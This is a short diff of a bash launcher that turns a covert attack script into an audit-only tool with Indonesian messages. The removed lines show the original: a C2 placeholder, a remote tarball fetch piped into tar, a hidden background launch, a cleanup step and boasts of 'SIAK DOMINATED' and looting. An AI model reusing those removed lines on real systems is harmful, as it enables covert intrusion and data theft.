@@ -1,18 +1,24 @@
+#!/usr/bin/env bash
 set -euo pipefail
-TARGET=${1:?} C2=${2:-"YOUR_C2"}
 
-# 1. Self-update
-curl -sSL https://YOUR_REPO/siak_suite.tar.gz | tar xz
+TARGET=${1:-}
+MODE=${2:-audit}
 
-# 2. Config
-sed -i "s/YOUR_C2/$C2/g" config.yaml
+if [[ -z "$TARGET" ]]; then
+  echo "Usage: $0 <target> [mode]"
+  echo "mode: audit (default)"
+  exit 2
+fi
 
-# 3. Stealth launch
-nohup python3 runner.py $TARGET > /dev/null 2>&1 &
-disown
+if [[ "$MODE" != "audit" ]]; then
+  echo "[!] Hanya mode 'audit' yang diizinkan."
+  exit 2
+fi
 
-# 4. Cleanup
-./cleanup.sh
+if [[ ! -f config.yaml ]]; then
+  echo "[!] config.yaml tidak ditemukan."
+  exit 1
+fi
 
-echo "[+] SIAK DOMINATED. Monitor: $C2:443"
-echo "[+] Loot ETA: 15min"
+python3 runner.py "$TARGET" --mode "$MODE"
+echo "[+] Audit selesai. Tidak ada aksi eksploitasi/persistence/exfil yang dijalankan."
